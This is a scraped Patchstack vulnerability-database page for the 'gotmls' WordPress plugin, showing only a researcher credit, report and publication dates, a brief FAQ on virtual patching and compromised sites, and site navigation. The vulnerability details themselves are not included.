[![stealthcopter](https://patchstack-database.s3.us-east-2.amazonaws.com/researcher/220/user-thumbnail.png?X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIATLPOZUEKEA5CDFOJ%2F20250110%2Fus-east-2%2Fs3%2Faws4_request&X-Amz-Date=20250110T182435Z&X-Amz-SignedHeaders=host&X-Amz-Expires=604800&X-Amz-Signature=bfc6383b1a866ff7e844f5e3f39f055d03d755e3d0d76516be669a7d8bcfe680)
stealthcopter](https://patchstack.com/database/researcher/01d0264f-f59a-4daa-a919-a6b2735e01db)

04 Jan 2024

![Published by Patchstack](https://patchstack.com/database/img/info.svg)

Published by Patchstack

12 Mar 2024

Go to

[![WordPress](https://patchstack.com/database/img/platforms/WordPress.svg)
Plugin page](https://patchstack.com/database/wordpress/plugin/gotmls)

[![No VDP](https://patchstack.com/database/img/shield-grey.svg)
No VDP](https://patchstack.com/for-plugins/)

How can Patchstack provide the fastest protection?

Patchstack is one of the largest open-source vulnerability disclosers in the world. For example, in 2023 more than 70% of new WordPress vulnerabilities were originally published by Patchstack. This focus on research enables us to deploy vulnerability protection rules faster than anybody else.

What is virtual patching?

Patchstack vPatching auto-mitigates security vulnerabilities even when there's no official patch available. It's the fastest and most effective way to eliminate new security vulnerabilities without sacrificing performance.

Why would a hacker target my website?

Hackers automate attacks against new security vulnerabilities to take over as many websites as they can before users have time to patch and update. The attacks are opportunistic and victims are not chosen - everyone is a target.

What if my website has already been compromised?

We recommend reaching out to your hosting provider for server-side malware scanning or use a professional incident response service. Don't rely on plugin based malware scanners as they are commonly tampered with by malware.

# Weekly WordPress security intelligence delivered to your inbox.

![vPatch available](https://patchstack.com/database/img/envelope.svg)

Subscribe

### Website security

[Pricing](https://patchstack.com/pricing/)
[For WordPress](https://patchstack.com/wordpress-security/)
[For WooCommerce](https://patchstack.com/woocommerce-security/)
[For agencies](https://patchstack.com/for-agencies/)
[API For hosts](https://patchstack.com/for-hosts/)
[Documentation](https://docs.patchstack.com/)
[FAQ](https://patchstack.com/wordpress-security/)
[Log in](https://app.patchstack.com/login)

### For plugin devs

[Managed VDP](https://patchstack.com/for-plugins/)
[Log inNEW](https://vdp.patchstack.com/vdp/login)
[Active programs](https://patchstack.com/database/vdp/?page=1)
[Security auditing](https://patchstack.com/auditing/)

### For researchers

[Bug bounty](https://patchstack.com/bug-bounty/)
[Log inNEW](https://vdp.patchstack.com/researchers/login)
[Guidelines](https://patchstack.com/articles/bug-bounty-guidelines-rules/)
[LearnNEW](https://patchstack.com/academy/welcome/)
[Discord](https://discord.com/invite/rkE8yxtNmS)

### Resources

[Vulnerability Database](https://patchstack.com/database/)
[Whitepaper 2024](https://patchstack.com/whitepaper/state-of-wordpress-security-in-2024)
[WordPress StatisticsNEW](https://patchstack.com/database/statistics/wordpress)
[Case studiesNEW](https://patchstack.com/category/case-studies/)
[Articles](https://patchstack.com/articles/)

### Patchstack

[About](https://patchstack.com/about/)
[Careers](https://patchstack.com/about/#careers)
[AffiliatesNEW](https://patchstack.com/affiliates/)
[Merch store](https://store.patchstack.com/)
[Media kit](https://drive.google.com/drive/u/2/folders/1VlVbJnh8nBTVtJGvuo8KjAOgstBWxQ_W)

### Socials

[LinkedIn](https://www.linkedin.com/company/patchtsack/)
[Facebook](https://www.facebook.com/groups/patchstackcommunity/)
[X](https://twitter.com/patchstackapp)

© 2025 Patchstack
[DPA](https://patchstack.com/data-processing-agreement-dpa/)
[Privacy Policy](https://patchstack.com/privacy-policy/)
[Terms & Conditions](https://patchstack.com/terms-and-conditions/)
![EU Logo](https://patchstack.com/database/img/eic-logo.png)

![](https://patchstack.com/database/img/logo.svg)
### Website security

[Pricing](https://patchstack.com/pricing/)
[For WordPress](https://patchstack.com/wordpress-security/)
[For WooCommerce](https://patchstack.com/woocommerce-security/)
[For agencies](https://patchstack.com/for-agencies/)
[API For hosts](https://patchstack.com/for-hosts/)
[Documentation](https://docs.patchstack.com/)
[FAQ](https://patchstack.com/wordpress-security/)
[Log in](https://app.patchstack.com/login)

### For plugin devs

[Managed VDP](https://patchstack.com/for-plugins/)
[Log inNEW](https://vdp.patchstack.com/vdp/login)
[Active programs](https://patchstack.com/database/vdp/?page=1)
[Security auditing](https://patchstack.com/auditing/)

### For researchers

[Bug bounty](https://patchstack.com/bug-bounty/)
[Log inNEW](https://vdp.patchstack.com/researchers/login)
[Guidelines](https://patchstack.com/articles/bug-bounty-guidelines-rules/)
[LearnNEW](https://patchstack.com/academy/welcome/)
[Discord](https://discord.com/invite/rkE8yxtNmS)

### Resources

[Vulnerability Database](https://patchstack.com/database/)
[Whitepaper 2024](https://patchstack.com/whitepaper/state-of-wordpress-security-in-2024)
[WordPress StatisticsNEW](https://patchstack.com/database/statistics/wordpress)
[Case studiesNEW](https://patchstack.com/category/case-studies/)
[Articles](https://patchstack.com/articles/)

### Patchstack

[About](https://patchstack.com/about/)
[Careers](https://patchstack.com/about/#careers)
[AffiliatesNEW](https://patchstack.com/affiliates/)
[Merch store](https://store.patchstack.com/)
[Media kit](https://drive.google.com/drive/u/2/folders/1VlVbJnh8nBTVtJGvuo8KjAOgstBWxQ_W)

### Socials

[LinkedIn](https://www.linkedin.com/company/patchtsack/)
[Facebook](https://www.facebook.com/groups/patchstackcommunity/)
[X](https://twitter.com/patchstackapp)

![Mobile Menu](https://patchstack.com/database/img/close-menu-mob.png)

## Let us know if we have missed a vulnerability reported elsewhere

Report
![arrow right](https://patchstack.com/database/img/chevron-right.svg)

![Mobile Menu](https://patchstack.com/database/img/close-menu-mob.png)
[Close](https://patchstack.com/database/)
## reCAPTCHA's verification failed!

## Thank you for contributing!

[Close](https://patchstack.com/database/)
![Mobile Menu](https://patchstack.com/database/img/close-menu-mob.png)


